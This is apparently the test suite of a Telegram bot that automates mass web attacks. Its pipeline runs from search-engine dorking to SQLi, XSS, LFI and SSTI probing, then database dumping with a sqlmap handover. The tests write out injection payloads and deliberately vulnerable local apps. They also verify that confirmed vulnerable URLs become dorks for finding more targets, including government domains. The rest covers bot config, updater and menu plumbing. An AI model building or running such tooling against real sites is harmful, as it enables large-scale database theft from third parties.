                                             "blind_len": 20, "blind_tables_len": 40,
                                             "blind_cols_len": 40, "requests": 900}, 5.0)

    res = _run_with_sqli_app(body)
    eq(res["status"], "injectable", "blind status")
    ok("blind" in (res["tech"] or ""), "blind technique: %s" % res["tech"])
    ok("users" in res["tables"], "blind tables: %s" % list(res["tables"]))
    ok("email" in (res["tables"].get("users") or {}).get("cols", []), "blind columns")

def test_large_data_guard():
    """Bada data mile to rows skip + vulnerable URL handover (asli local app)."""
    group("large-guard")
    import sqlite3
    from aiohttp import web

    async def run():
        db = sqlite3.connect(":memory:", check_same_thread=False)
        db.executescript("CREATE TABLE logs(id INTEGER PRIMARY KEY, msg TEXT);")
        db.executemany("INSERT INTO logs(id,msg) VALUES (?,?)",
                       [(i, "line-%d" % i) for i in range(1, 41)])

        async def v(req):
            sql = "SELECT id,msg FROM logs WHERE id = %s" % req.query.get("id", "1")
            try:
                rows = db.execute(sql).fetchall()
            except Exception as e:
                return web.Response(status=500,
                                    text="<html>sqlite3.OperationalError: %s</html>" % e,
                                    content_type="text/html")
            body = "<html><body>" + "".join(
                "<div>%s|%s</div>" % (a, b) for a, b in rows)
            return web.Response(text=body + "</body></html>", content_type="text/html")

        app = web.Application()
        app.add_routes([web.get("/v.php", v)])
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, "127.0.0.1", 0)
        await site.start()
        port = site._server.sockets[0].getsockname()[1]
        base = "http://127.0.0.1:%d" % port
        try:
            conn = core.mk_connector()
            async with core.aiohttp.ClientSession(connector=conn) as sess:
                return await core.sqli_dump_one(
                    sess, base + "/v.php?id=1", "",
                    {"tables": 5, "rows": 3, "blind": 1, "blind_len": 20,
                     "requests": 400}, 5.0)
        finally:
            await runner.cleanup()

    res = asyncio.run(run())
    eq(res["status"], "injectable", "large status")
    ok(res.get("large") is True, "large flag set")
    ok(res.get("large_reason"), "large reason: %s" % res.get("large_reason"))
    logs = res["tables"].get("logs") or {}
    eq(logs.get("total_rows"), 40, "row count read")
    ok(logs.get("skipped") is True, "rows skipped (not ground)")
    eq(logs.get("rows"), [], "koi row dump nahi hui")
    ok(res.get("poc") and res["poc"].endswith("/v.php?id=1"),
       "poc = clean url: %s" % res.get("poc"))
    ok(any("LARGE DATA" in n for n in res["notes"]), "note me LARGE DATA")

    txt = "\n".join(core.sqli_report_text(res))
    contains(txt, "LARGE DATA FOUND")
    contains(txt, "sqlmap -u")
    contains(txt, "skipped")


def test_large_guard_card():
    """Card me handover line + large targets file."""
    group("large-card")
    real_dump, real_save, real_send = core.sqli_dump, core.sqli_save, core.send_file
    sent = []

    async def fake_dump(urls, targets=None, caps=None, timeout=8.0, conc=3,
                        progress=None, uid=None):
        res = {"url": urls[0], "param": "id", "ok": True, "status": "injectable",
               "dbms": "MySQL", "tech": "boolean + UNION", "db": "shop", "dbs": ["shop"],
               "tables": {"users": {"cols": ["id"], "rows": [], "truncated": True,
                                    "skipped": True, "total_rows": 9000}},
               "notes": ["LARGE DATA: use a dedicated dumper"], "rows": 0, "requests": 30,
               "took": 2.0, "why": "", "large": True,
               "large_reason": "users has 9,000 rows (inline cap 8)",
               "poc": "https://x.example/p.php?id=1",
               "tables_total": 3}
        return {"urls": len(urls), "done": len(urls), "results": [res], "rows": 0,
                "tables": 1, "injectable": 1, "start": core.time.time() - 2,
                "stage": "rows", "stage_info": "users", "stopped": 0, "took": 2.0}

    def fake_save(st):
        return {"files": ["/tmp/sql_x.txt"], "zip": "/tmp/sql_x.zip", "csv": "", "rows": 0}

    async def fake_send(update, path, caption=""):
        sent.append(path)
        return True

    core.sqli_dump, core.sqli_save, core.send_file = fake_dump, fake_save, fake_send
    try:
        ctx = FakeContext({"last_urls": ["https://x.example/p.php?id=1"]})
        upd = FakeUpdate(data="df:last")
        asyncio.run(core.cb_dump_use(upd, ctx, "last"))
        body = "\n".join(upd.texts())
        contains(body, "LARGE DATA FOUND")
        contains(body, "sqlmap -u")
        ok(any("large_targets_" in p for p in sent), "large targets file sent")
    finally:
        core.sqli_dump, core.sqli_save, core.send_file = real_dump, real_save, real_send

def test_silent_kill_guard():
    """Button fail ho to user ko OOPS card milta hai — kabhi chup-chaap nahi."""
    group("silent-guard")
    real = core.TOOL_HANDLERS.get("kw")

    async def boom(update, context):
        raise RuntimeError("synthetic failure")

    core.TOOL_HANDLERS["kw"] = boom
    try:
        ctx = FakeContext({})
        upd = FakeUpdate(data="m:kw")
        asyncio.run(core.on_callback(upd, ctx))
        body = "\n".join(upd.texts())
        contains(body, "synthetic failure")
        ok(("error" in body.lower()) or ("oops" in body.lower()), "visible error card")
        ok(len(upd.texts()) >= 1, "koi jawab to mila")
    finally:
        core.TOOL_HANDLERS["kw"] = real

    # HTML helper
    eq(core.html_plain("<b>bold</b> &amp; <code>x</code>"), "bold & x", "html_plain")
    eq(core.html_plain("no tags here"), "no tags here", "html_plain plain")
    ok(core._is_parse_error(Exception("can't parse entities")) is True, "parse err detect")

    # patch real PTB Message class
    core._patch_telegram_safe()
    from telegram import Message
    ok(getattr(Message, "_snake_safe", False), "Message patched")
    core._patch_telegram_safe()          # dobara safe
    ok(True, "idempotent")


def test_injector_small_matrix():
    group("injector-small")
    probes = core.inj_probes_for("all")
    ok(len(probes) <= 8, "payloads kam: %d" % len(probes))
    for need in ("sqli", "union", "nosql", "xss", "lfi", "ssti", "redirect"):
        ok(any(f == need for f, _p in probes), "family %s" % need)
    ok(not any("SLEEP" in p.upper() for _f, p in probes), "no slow sleep probe")
    eq(int(core.sget("inj_targets", 24) if core.sget("inj_targets") else 24), 24,
       "default per-url cap")


def test_keywords_variety():
    group("keywords-variety")
    seeds = ["shopify store", "crypto wallet", "apk download"]
    kws = core.make_keywords(seeds, n=60)
    eq(len(kws), 60, "60 keywords")
    eq(len(set(kws)), 60, "unique")
    # pehle 20 me kam se kam 6 patterns (ek hi pattern repeat nahi)
    pats = set()
    for k in kws[:20]:
        first = k.split()[0]
        pats.add("pre" if first in core.KW_PRE else ("core" if first in [w for w in seeds] else "suf"))
    ok(len(pats) >= 2, "pattern mix: %s" % pats)
    # cores rotate — pehle 10 me 2+ seeds
    tops = {k for k in kws[:10] if any(s in k for s in seeds)}
    used = {s for s in seeds if any(s in k for k in kws[:10])}
    ok(len(used) >= 2, "cores rotate: %s" % used)
    # single seed se bhi bada volume
    one = core.make_keywords(["crypto wallet"], n=20000)
    ok(len(one) >= 20000, "1 seed se 20k+: %d" % len(one))
    # dorks variety
    d = core.kw_to_dorks(seeds, n=12)
    eq(len(d), 12, "12 dorks")
    ok(len({x.split(":")[0] for x in d}) >= 3, "dork templates mix")


def test_parser_settings():
    group("parser-settings")
    for k in ("pages", "threads", "timeout"):
        ok(k in core.PARSER_CYCLES, "cycle %s" % k)
    # cycles actually change value + card render
    core.sset("parse_pages", 1)
    ctx = FakeContext({})
    upd = FakeUpdate(data="pr:set:pages")
    asyncio.run(core.cb_parse_cfg(upd, ctx, "pages"))
    eq(int(core.sget("parse_pages")), 2, "pages cycle 1→2")
    core.sset("parse_threads", 4)
    asyncio.run(core.cb_parse_cfg(upd, ctx, "threads"))
    eq(int(core.sget("parse_threads")), 6, "threads cycle 4→6")
    core.sset("parse_timeout", 8)
    asyncio.run(core.cb_parse_cfg(upd, ctx, "timeout"))
    eq(int(core.sget("parse_timeout")), 12, "timeout cycle 8→12")
    # card text
    upd2 = FakeUpdate(data="pr:cfg")
    asyncio.run(core.cb_parse_cfg(upd2, ctx, ""))
    card = upd2.last_text()
    ok(len(card) > 200, "settings card render")
    kb = [kw.get("reply_markup") for _k, _t, kw in upd2.sink if kw.get("reply_markup")]
    labels = []
    for markup in kb:
        for row in getattr(markup, "inline_keyboard", []):
            for b in row:
                labels.append(b.text)
    ok(len(labels) >= 5, "settings buttons: %d" % len(labels))
    ok(any("2" in l for l in labels), "pages value dikhta hai")
    ok(any("6" in l for l in labels), "threads value dikhta hai")
    ok(any("12" in l for l in labels), "timeout value dikhta hai")
    # parse() threads ko respect karta hai — fake engine se count
    calls = []

    async def fake_fetch(session, engine, dork, proxy=None, timeout=15.0, page=0,
                         rot=None, miss=None):
        calls.append((engine, dork))
        return ["https://x.example/%s?q=%s" % (engine, abs(hash(dork)) % 99)]

    real = core.fetch_engine
    core.fetch_engine = fake_fetch
    try:
        core.sset("parse_threads", 3)
        core.sset("parse_timeout", 6)
        res = asyncio.run(core.parse(["inurl:login a", "inurl:login b"], max_urls=20,
                                     pages=1, engines=["ddg", "bing"], strict=False))
        ok(len(res["urls"]) >= 2, "parse urls: %d" % len(res["urls"]))
        ok(len(calls) >= 2, "engines called")
    finally:
        core.fetch_engine = real
        for k, v in (("parse_pages", 1), ("parse_threads", 4), ("parse_timeout", 0)):
            core.sset(k, v)

def test_paste_smart_fallback():
    group("paste-fallback")
    ctx = FakeContext({})
    upd = FakeUpdate(text="https://a.example/x.php?id=1\nhttps://b.example/y.php?q=2")
    asyncio.run(core.on_text(upd, ctx))
    body = upd.last_text()
    ok(body.strip(), "URL detected screen (styled heading)")
    eq(len(ctx.user_data.get("paste_urls") or []), 2, "urls stored")
    kb = [kw.get("reply_markup") for _k, _t, kw in upd.sink if kw.get("reply_markup")]
    datas = [b.callback_data for m in kb for row in getattr(m, "inline_keyboard", []) for b in row]
    for need in ("inj:paste", "df:paste", "df:hpaste"):
        ok(need in datas, "button %s" % need)

    ctx2 = FakeContext({})
    upd2 = FakeUpdate(text="inurl:login.php\ninurl:product.php?id=")
    asyncio.run(core.on_text(upd2, ctx2))
    ok(upd2.last_text().strip(), "dork detected screen (styled heading)")
    eq(len(ctx2.user_data.get("paste_dorks") or []), 2, "dorks stored")

    ctx3 = FakeContext({})
    upd3 = FakeUpdate(text="hello bhai")
    asyncio.run(core.on_text(upd3, ctx3))
    ok("URLs" in upd3.last_text(), "help fallback")

def test_no_dead_buttons():
    """/m:har literal button ka jawab aana chahiye (silent kill = 0)."""
    group("dead-buttons")
    for data in ("m:help_noTut", "m:help", "m:kw", "m:parse", "m:inj", "m:dump",
                 "a:emoji", "a:emojitest"):
        ctx = FakeContext({"last_dorks": ["inurl:login"]})
        upd = FakeUpdate(data=data)
        asyncio.run(asyncio.wait_for(core._on_callback_inner(upd, ctx), 8))
        got = upd.texts() or [t for k, t, _kw in upd.sink if k == "answer"]
        ok(bool(got), "%s ne jawab diya" % data)
    # how-to-use button ab alert deta hai
    ctx = FakeContext({})
    upd = FakeUpdate(data="m:help_noTut")
    asyncio.run(core._on_callback_inner(upd, ctx))
    alerts = [t for k, t, kw in upd.sink if k == "answer" and kw.get("show_alert")]
    ok(alerts, "help_noTut alert: %s" % alerts)

def test_build_stamp():
    """/ping me build + guard flags dikhte hain (deploy verify ke liye)."""
    group("build-stamp")
    eq(core.VERSION, "v2.15.0", "version")
    ok(getattr(core, "BUILD", ""), "BUILD set")
    ok(getattr(core, "BUILD_TS", ""), "BUILD_TS set")
    ctx = FakeContext({})
    upd = FakeUpdate(uid=ADMIN, text="/ping")
    asyncio.run(core.cmd_ping(upd, ctx))
    txt = upd.last_text()
    contains(txt, core.VERSION)
    contains(txt, "Build")
    contains(txt, core.BUILD)
    contains(txt, "Silent-guard")
    contains(txt, str(len(core.inj_probes_for("all"))))
    contains(txt, "Loaded")
    src = open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            "bot.py"), encoding="utf-8").read()
    contains(src, "BOT ALREADY RUNNING ELSEWHERE")
    contains(src, "delete_webhook")
    # update.sh self-updating hai
    up = open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                           "vps", "termux_update.sh"), encoding="utf-8").read()
    contains(up, "SNAKE_UPDATER_V")
    contains(up, "SNAKE_NO_SELF")
    contains(up, "DBF copy skip")

def test_config_persistence():
    """Token/Admin update ke baad bhi bache — external config file."""
    group("config-safe")
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    bot = os.path.join(root, "bot.py")
    src = open(bot, encoding="utf-8").read()
    contains(src, 'CONFIG_NAME = "snake_config.json"')
    contains(src, "def _read_config")
    contains(src, "def _save_config")
    contains(src, "_migrate_config()")
    contains(src, "Config")
    eq(core.CONFIG_NAME, "snake_config.json", "config name")

    # update.sh: config guard hai aur config kabhi delete nahi karta
    up = open(os.path.join(root, "vps", "termux_update.sh"), encoding="utf-8").read()
    contains(up, "CONFIG GUARD")
    contains(up, "snake_config.json")
    ok('rm -f "$CFG"' not in up, "update.sh config delete nahi karta")
    contains(up, "setconfig.sh")

    # setconfig.sh maujood + usable
    sc = os.path.join(root, "setconfig.sh")
    ok(os.path.exists(sc), "setconfig.sh file hai")
    sct = open(sc, encoding="utf-8").read()
    contains(sct, "--addadmin")
    contains(sct, "--token")
    contains(sct, "--show")
    ok("snake_config.json" in sct, "setconfig config file likhta hai")

    # runtime: temp install me config se token/admin load hote hain
    tmp = tempfile.mkdtemp(prefix="snakecfg_")
    try:
        shutil.copy(bot, os.path.join(tmp, "bot.py"))
        with open(os.path.join(tmp, "snake_config.json"), "w", encoding="utf-8") as f:
            json.dump({"bot_token": "123456:AAHfrom_config_0001",
                       "admin_ids": [111222333, 444555666]}, f)
        spec = importlib.util.spec_from_file_location(
            "snake_cfg_probe", os.path.join(tmp, "bot.py"))
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        eq(mod.BOT_TOKEN, "123456:AAHfrom_config_0001", "config se token")
        eq(mod.ADMIN_IDS, [111222333, 444555666], "config se admins")
        eq(mod.CONFIG_PATH, os.path.join(tmp, "snake_config.json"), "config path")
        ok(any(os.path.abspath(p) == os.path.abspath(os.path.join(tmp, "snake_config.json"))
               for p in mod._config_paths()), "config paths me temp dir")

        # token ud gaya ho to backup se recover
        os.makedirs(os.path.join(tmp, "backups"), exist_ok=True)
        with open(os.path.join(tmp, "backups", "bot_20260101_000000.py"), "w",
                  encoding="utf-8") as f:
            f.write('BOT_TOKEN = "999999:AAHbackup_token_recover"\n'
                    "ADMIN_IDS = [111222333, 909090909]\n")
        tok, adm = mod._recover_from_backups()
        eq(tok, "999999:AAHbackup_token_recover", "backup se token")
        eq(adm, [111222333, 909090909], "backup se admins")
        ok(mod._token_ok(tok), "_token_ok true")
        ok(not mod._token_ok("PUT_YOUR_BOT_TOKEN_HERE"), "_token_ok placeholder false")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    # placeholder token se config file na bane (repo saaf rahe)
    ok(not os.path.exists(os.path.join(root, "snake_config.json")),
       "repo me config file nahi")

    # /ping me config line
    ctx = FakeContext({})
    upd = FakeUpdate(uid=ADMIN, text="/ping")
    asyncio.run(core.cmd_ping(upd, ctx))
    contains(upd.last_text(), "Config")

def test_menu_emoji():
    """Main menu emoji — user ne jo maange wahi."""
    group("menu-emoji")
    eq(core.EMOJI["kw"], "🔑", "keywords emoji same")
    eq(core.EMOJI["dork"], "🧬", "dorker 🧬")
    eq(core.EMOJI["parse"], "🌐", "parser 🌐")
    eq(core.EMOJI["rev"], "🔗", "url reverse 🔗")
    eq(core.EMOJI["inj"], "💉", "injector same")
    eq(core.EMOJI["dump"], "📁", "dumper 📁")
    eq(core.EMOJI["qa"], "📊", "quality same")

    kb = core.kb_main(ADMIN)
    labels = [b.text for row in kb.inline_keyboard for b in row]
    joined = " ".join(labels)
    for want in ("🧬", "🌐", "🔗", "💉", "📁", "📊", "🔑"):
        ok(want in joined, "menu me %s" % want)
    # theme font text ko style karta hai — emoji se check karo
    ok(any(x.startswith("🧬") for x in labels), "DORKER button")
    ok(any(x.startswith("📁") for x in labels), "DUMPER button")


def test_premium_emoji():
    """Premium (animated) emoji feature OFF — sirf normal emoji."""
    group("premium-emoji")
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    src = open(os.path.join(root, "bot.py"), encoding="utf-8").read()
    ok('CommandHandler("se", cmd_se)' not in src, "koi /se command nahi")
    ok('callback_data="a:emoji"' not in src, "koi premium emoji button nahi")
    for slot, want in (("kw", "🔑"), ("dork", "🧬"), ("parse", "🌐"),
                       ("rev", "🔗"), ("inj", "💉"), ("dump", "📁"), ("qa", "📊")):
        eq(core.emo(slot), want, "emo %s plain" % slot)
    eq(core.emo_btn("dump"), "📁", "button emoji plain")
    ctx = FakeContext({})
    upd = FakeUpdate(uid=ADMIN, text="/ping")
    asyncio.run(core.cmd_ping(upd, ctx))
    txt = upd.last_text()
    ok("Premium emoji" not in txt, "ping me premium line nahi")
    contains(txt, core.VERSION)


def test_v211_bugfixes():
    """v2.11 — parser parallel, injector accuracy/speed, dumper sync, vuln→dorks."""
    group("v2.11 fixes")

    # ── 1) parser: dork-level parallel workers ──
    real_fetch = core.fetch_engine
    real_proxy = core.proxy_available
    real_gj = core.gj_enabled
    seen_dorks = []
    concurrent = {"now": 0, "max": 0}

    async def fake_fetch(session, engine, dork, proxy=None, timeout=15, page=0,
                         rot=None, miss=None):
        seen_dorks.append(dork)
        concurrent["now"] += 1
        concurrent["max"] = max(concurrent["max"], concurrent["now"])
        await asyncio.sleep(0.05)
        concurrent["now"] -= 1
        if engine == "bing":
            return ["https://p%s.example.com/item.php?id=%d" % (abs(hash(dork)) % 97, i)
                    for i in range(4)]
        return []

    core.fetch_engine = fake_fetch
    core.proxy_available = lambda: False
    core.gj_enabled = lambda: False
    try:
        res = asyncio.run(core.parse_deep(
            ["inurl:item.php?id=%d" % i for i in range(24)], max_urls=5000,
            pages=1, use_proxy=False, strict=False, mode="fast", budget=30))
    finally:
        core.fetch_engine = real_fetch
        core.proxy_available = real_proxy
        core.gj_enabled = real_gj
    st = res["stats"]
    eq(st["scanned"], 24, "saare dorks scan")
    ok(st["workers"] >= 2, "parallel workers >= 2 (%s)" % st["workers"])
    ok(concurrent["max"] >= 2, "ek saath kai dorks (%d)" % concurrent["max"])
    ok(st["unique"] >= 24, "urls mile (%d)" % st["unique"])
    ok("remaining_dorks" in st, "resume list")

    # ── 2) injector: false positives band ──
    # normal page jisme "mysql"/"sqlite" likha hai — vulnerable NAHI
    eq(core.inj_verdict("sqli", "'", 200, {},
                        "<html>We use MySQL and SQLite and PostgreSQL.</html>"),
       {}, "generic mysql text = clean")
    eq(core.inj_verdict("sqli", "'", 200, {},
                        "You have an error in your SQL syntax near '1'").get("type"),
       "SQLi", "asli error = SQLi")
    # SSTI: page me "49" hai par template evaluate nahi hua
    eq(core.inj_verdict("ssti", "{{1337*1337}}", 200, {}, "price 49 rupees"), {},
       "49 ≠ SSTI")
    eq(core.inj_verdict("ssti", "{{1337*1337}}", 200, {}, "result 1787569").get("type"),
       "SSTI", "unique number = SSTI")
    # baseline me pehle se error hai (broken site) → XSS count nahi
    eq(core.inj_verdict("xss", '"><svg/onload=alert(1)>', 200, {},
                        '<body>"><svg/onload=alert(1)></body>',
                        "shop.com", '<body>"><svg/onload=alert(1)></body>'), {},
       "baseline me same = clean")
    # LFI markers tight
    eq(core.inj_verdict("lfi", "../x", 200, {}, "docs about /bin/bash usage"), {},
       "bin/bash alone = clean")
    eq(core.inj_verdict("lfi", "../x", 200, {}, "root:x:0:0:root:/root:/bin/sh").get("type"),
       "LFI", "passwd = LFI")

    # ── 3) injector: flat queue speed (slow URL doosre ko na roke) ──
    from aiohttp import web

    async def slow(req):
        await asyncio.sleep(0.6)
        return web.Response(text="ok", content_type="text/html")

    async def fast(req):
        return web.Response(text="ok", content_type="text/html")

    async def go():
        app = web.Application()
        app.router.add_get("/slow.php", slow)
        app.router.add_get("/fast.php", fast)
        runner = web.AppRunner(app, access_log=None)
        await runner.setup()
        site = web.TCPSite(runner, "127.0.0.1", 0)
        await site.start()
        port = site._server.sockets[0].getsockname()[1]
        base = "http://127.0.0.1:%d" % port
        try:
            return await core.inj_scan(
                [base + "/slow.php?id=1"] + [base + "/fast.php?id=%d" % i for i in range(6)],
                "all", timeout=3.0, conc=16, max_targets=8)
        finally:
            await runner.cleanup()

    st2 = asyncio.run(go())
    ok(st2["tested"] >= 40, "flat queue requests (%d)" % st2["tested"])
    ok(st2["took"] < 8.0, "slow URL ne block nahi kiya (%.1fs)" % st2["took"])
    ok(st2["urls_done"] == 7, "saari URLs done (%d)" % st2["urls_done"])

    # ── 4) vuln URL → UHQ dorks (bina keywords) ──
    ds = core.vuln_reverse_dorks(["https://shop.example.com/product.php?id=12&cat=5"],
                                 n=90)
    ok(len(ds) >= 10, "dorks bane (%d)" % len(ds))
    ok(any("product.php?id=" in d for d in ds), "exact shape dork")
    ok(any("ext:php" in d for d in ds), "extension dork")
    ok(any("site:.gov.in" in d for d in
           core.vuln_reverse_dorks(["https://a.gov.in/view.php?uid=1"])), "gov suffix")
    ok(not any("site:.com" in d for d in ds), "broad .com target nahi")
    ok(not any(k in " ".join(ds).lower() for k in ("buy", "cheap", "best")),
       "keywords nahi")
    eq(core.host_suffix("a.co.uk"), "co.uk", "co.uk suffix")
    eq(core.host_suffix("shop.example.com"), "com", "com suffix")

    # ── 5) dumper: injector ke confirmed URLs count dikhe ──
    src = open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            "bot.py"), encoding="utf-8").read()
    contains(src, "Injector confirmed")
    contains(src, 'df:frominj')
    contains(src, "injector ne confirm kiya tha")
    contains(src, "INJ_CONFIRM")
    contains(src, "1787569")

def test_v212_engines():
    """v2.12 — bing-only fix, engine doctor, AUTO engine-proxy."""
    group("v2.12 engines")
    # bingr (RSS) hamesha available
    ok("bingr" in core.ENGINE_URLS, "bingr engine")
    ok("format=rss" in core.ENGINE_URLS["bingr"], "bingr RSS URL")
    for e in ("bing", "bingr", "mojeek", "ddgl", "yahoo"):
        ok(e in core.ENGINE_URLS, "engine %s" % e)
    ok(not core.ENGINE_MULTI, "koi multi-instance nahi")
    # AUTO proxy: proxy se block hone wale direct, block karne wale proxy
    # ab saare bache engines proxy-safe hain → auto me proxy use hota hai
    for e in core.ENGINE_URLS:
        eq(core.parse_engine_proxy(e, "auto"), True, "%s proxy-safe (auto)" % e)
        eq(core.parse_engine_proxy(e, "off"), False, "%s direct (off)" % e)
    eq(core.parse_engine_proxy("google", "off"), False, "off = sab direct")
    eq(core.parse_engine_proxy("bingr", "on"), True, "on = sab proxy")
    # har engine ka fix hint maujood
    for e in core.ENGINE_URLS:
        ok(core.engine_fix(e, "http 429"), "fix hint %s" % e)

    ok("proxy" in core.engine_fix("bing", "timeout").lower(), "timeout fix")
    # doctor button + route
    src = open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            "bot.py"), encoding="utf-8").read()
    contains(src, 'callback_data="pr:doctor"')
    contains(src, 'rest == "doctor"')
    # parser settings me proxy mode
    ok("pxmode" in core.PARSER_CYCLES, "pxmode setting")
    eq(core.PARSER_CYCLES["pxmode"][1], ["auto", "off", "on"], "pxmode values")
    # bingr extract (RSS)
    rss = ("<rss><channel><item><title>x</title>"
           "<link>https://a.com/p.php?id=1</link></item>"
           "<item><link>https://b.com/q.php?id=2</link></item></channel></rss>")
    got = core.extract_urls("bingr", rss)
    ok(any("a.com/p.php" in u for u in got), "bingr url 1")
    ok(any("b.com/q.php" in u for u in got), "bingr url 2")

def test_v2122_bing_quality():
    """v2.12.2 — Bing se zyada + saaf results (RSS 50/page, redirect unwrap)."""
    group("v2.12.2 bing quality")
    url = core.ENGINE_URLS["bingr"]
    contains(url, "format=rss")
    contains(url, "count=50")
    contains(url, "mkt=en-US")
    eq(core.ENGINE_PAGE["bingr"], (1, 50), "RSS page step 50")
    # redirect unwrap — bing.com/ck/a?u=<base64> se asli URL
    rss = ("<rss><channel>"
           "<item><link>https://shop-a.com/product.php?id=12</link></item>"
           "<item><link>https://www.bing.com/ck/a?!&amp;&amp;p=x&amp;u="
           "a1aHR0cHM6Ly9nb3YtYi5pbi9sb2dpbi5waHA_aWQ9Nw</link></item>"
           "</channel></rss>")
    got = core.extract_urls("bingr", rss)
    ok(any("shop-a.com/product.php" in u for u in got), "seedha link")
    ok(any("gov-b.in/login.php" in u for u in got), "redirect unwrap")
    ok(not any("bing.com" in u for u in got), "bing ke apne links nahi")
    # default pages = 2 (display bhi wahi dikhaye)
    src = open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            "bot.py"), encoding="utf-8").read()
    contains(src, 'sget("parse_pages", 3)')

def test_v2130_token_repair():
    """v2.13.0 — khaali-token config khud repair ho + scripts self-install + lock."""
    group("v2.13.0 token repair")
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    src = open(os.path.join(root, "bot.py"), encoding="utf-8").read()
    contains(src, "config repaired")
    contains(src, "_HELPER_FILES")
    contains(src, "def install_helpers")
    contains(src, "def acquire_lock")
    contains(src, "BOT ALREADY RUNNING")

    tmp = tempfile.mkdtemp(prefix="snake213_")
    old_base, old_cfg, old_path = core.BASE_DIR, dict(core._CONFIG), core.CONFIG_PATH
    old_tok, old_adm = core.BOT_TOKEN, list(core.ADMIN_IDS)
    old_nomig = os.environ.pop("SNAKE_NO_MIGRATE", None)
    try:
        core.BASE_DIR = tmp
        # khaali token wali config (purani galti)
        cfgp = os.path.join(tmp, "snake_config.json")
        with open(cfgp, "w", encoding="utf-8") as f:
            json.dump({"bot_token": "", "admin_ids": [8999053405]}, f)
        core._CONFIG.clear()
        core._CONFIG.update({"bot_token": "", "admin_ids": [8999053405]})
        core.CONFIG_PATH = cfgp
        core.BOT_TOKEN = "123456:AAHrepair_me_now"
        core._migrate_config()
        core._migrate_config()          # dobara chalao — token na khoye
        with open(cfgp, encoding="utf-8") as f:
            fixed = json.load(f)
        eq(fixed.get("bot_token"), "123456:AAHrepair_me_now", "config repaired")

        # scripts khud install (purani tuti file bhi overwrite ho)
        stale = os.path.join(tmp, "start.sh")
        with open(stale, "w", encoding="utf-8") as f:
            f.write("#!/bin/bash\necho purana tuta start\n")
        wrote = core.install_helpers()
        for name in ("snake_lib.sh", "start.sh", "stop.sh", "restart.sh",
                     "status.sh", "update.sh"):
            ok(name in wrote, "installed %s" % name)
            ok(os.path.isfile(os.path.join(tmp, name)), "%s file" % name)
        lib = open(os.path.join(tmp, "snake_lib.sh"), encoding="utf-8").read()
        contains(lib, "snake_kill_all")
        contains(lib, "SNAKE_LIB_V")
        contains(lib, "screen -wipe")
        boot = open(os.path.join(tmp, "update.sh"), encoding="utf-8").read()
        contains(boot, "SNAKE_BOOT_V")
        contains(boot, "termux_update.sh")

        # scripts already latest → dobara likhne ki zarurat nahi
        eq(core.install_helpers(), [], "scripts idempotent")

        # lock — doosra zinda bot instance block ho
        lockp = os.path.join(tmp, ".snake.lock")
        core.LOCK_FILE = lockp
        with open(lockp, "w", encoding="utf-8") as f:
            f.write("424242")
        _orig_pidcheck = core._pid_is_bot
        core._pid_is_bot = lambda pid: int(pid) == 424242
        ok(not core.acquire_lock(), "running instance block")
        core._pid_is_bot = _orig_pidcheck
        os.remove(lockp)
        with open(lockp, "w", encoding="utf-8") as f:
            f.write("1")            # PID 1 zinda hai, par bot.py nahi → lock allow
        ok(core.acquire_lock(), "stale lock allow")
        eq(open(lockp).read().strip(), str(os.getpid()), "lock me apna pid")
        core.release_lock()
        ok(not os.path.exists(lockp), "release lock")
    finally:
        core.BASE_DIR, core.CONFIG_PATH = old_base, old_path
        core._CONFIG.clear()
        core._CONFIG.update(old_cfg)
        core.BOT_TOKEN, core.ADMIN_IDS = old_tok, old_adm
        if old_nomig:
            os.environ["SNAKE_NO_MIGRATE"] = old_nomig
        shutil.rmtree(tmp, ignore_errors=True)

def test_v2131_update_proof():
    """v2.13.1 — token kabhi khaali disk pe nahi + updater multi-source."""
    group("v2.13.1 update-proof")
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    up = open(os.path.join(root, "vps", "termux_update.sh"), encoding="utf-8").read()
    for bit in ("SNAKE_UPDATER_V=6", "fetch_file", "api.github.com", "codeload.github.com",
                "token kahin nahi mila", "snake_kill_all", "UPDATER_V=6"):
        contains(up, bit)
    boot = open(os.path.join(root, "update.sh"), encoding="utf-8").read()
    for bit in ("SNAKE_BOOT_V=6", "API_DL", "codeload.github.com", "TAR_DL"):
        contains(boot, bit)
    sc = open(os.path.join(root, "setconfig.sh"), encoding="utf-8").read()
    contains(sc, "KHAALI token wali config KABHI nahi banti")
    contains(sc, "khaali token kabhi disk pe nahi")
    ok("8937044612" in sc, "owner default admin")
    lib = open(os.path.join(root, "snake_lib.sh"), encoding="utf-8").read()
    contains(lib, "SNAKE_LIB_V=6")
    contains(lib, "*/bot.py")                 # absolute-path wala process bhi kill
    contains(lib, "snake_$(date +%s)")          # naam clash → unique session name
    contains(lib, "snake_lock_clear")

    tmp = tempfile.mkdtemp(prefix="snake2131_")
    old_paths = core._config_paths
    old_cfg = dict(core._CONFIG)
    old_tok = core.BOT_TOKEN
    try:
        empty_p = os.path.join(tmp, "snake_config.json")
        good_p = os.path.join(tmp, "dbf_config.json")
        with open(empty_p, "w", encoding="utf-8") as f:
            json.dump({"bot_token": "", "admin_ids": [111]}, f)
        with open(good_p, "w", encoding="utf-8") as f:
            json.dump({"bot_token": "123456:AAHgood_token_here", "admin_ids": [222]}, f)
        core._config_paths = lambda: [empty_p, good_p]
        cfg, pth = core._read_config()
        eq(cfg.get("bot_token"), "123456:AAHgood_token_here", "valid config wins")
        eq(pth, good_p, "best config path")

        # start par khaali config bhi heal ho jati hai
        core._heal_configs("123456:AAHgood_token_here")
        with open(empty_p, encoding="utf-8") as f:
            eq(json.load(f).get("bot_token"), "123456:AAHgood_token_here",
               "heal empty config")

        # save: _CONFIG me token khaali ho to bhi disk ka token na khoye
        old_base = core.BASE_DIR
        core.BASE_DIR = tmp
        core._CONFIG.clear()
        core._CONFIG.update({"bot_token": "", "admin_ids": [222]})
        core._save_config()
        core.BASE_DIR = old_base
